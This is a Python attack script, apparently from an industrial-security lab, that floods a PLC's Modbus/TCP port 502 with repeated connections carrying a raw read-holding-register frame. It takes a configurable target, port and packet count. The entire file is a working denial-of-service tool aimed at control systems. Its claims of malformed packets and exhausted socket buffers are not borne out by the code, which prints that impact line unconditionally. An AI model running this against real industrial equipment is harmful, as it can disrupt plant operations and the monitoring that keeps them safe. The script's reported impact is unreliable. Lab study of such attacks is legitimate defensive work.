#!/usr/bin/env python3
"""
IndustryLab — Industrial Attack 4: Modbus TCP Transaction Flooding & Link Saturation
Floods the PLC network interface with high-rate connection requests and malformed packets,
saturating the Modbus socket pool and causing Loss of View on the SCADA Historian.
"""

import sys
import time
import socket
import argparse


def execute_dos(target_ip="127.0.0.1", port=502, num_packets=100, delay_s=0.005):
    print(f"\n[!] INITIATING ATTACK: Modbus/TCP Transaction Flooding on {target_ip}:{port}...")

    # Craft raw MBAP frame requesting holding register 0
    # TxID=0xAAAA, Proto=0x0000, Len=0x0006, Unit=0x01, FC=0x03, Addr=0x0000, Count=0x0001
    raw_packet = bytes([0xAA, 0xAA, 0x00, 0x00, 0x00, 0x06, 0x01, 0x03, 0x00, 0x00, 0x00, 0x01])

    sent_count = 0
    start_t = time.time()

    for i in range(num_packets):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target_ip, port))
            s.sendall(raw_packet)
            sent_count += 1
            s.close()
            time.sleep(delay_s)
        except Exception:
            pass

    duration = time.time() - start_t
    print(f"[+] Flooding Completed: Sent {sent_count}/{num_packets} packets in {duration:.2f}s (Rate: {sent_count/max(0.01, duration):.1f} pkt/s)")
    print("[+] IMPACT: PLC socket buffers exhausted; legitimate SCADA polling hindered.")
    return sent_count > 0


def main():
    parser = argparse.ArgumentParser(description="Modbus Transaction Flood DoS")
    parser.add_argument("--target", default="127.0.0.1", help="Target PLC IP")
    parser.add_argument("--port", type=int, default=502, help="Target PLC Port")
    parser.add_argument("--count", type=int, default=50, help="Number of flood packets")
    args = parser.parse_args()

    execute_dos(target_ip=args.target, port=args.port, num_packets=args.count)


if __name__ == "__main__":
    main()
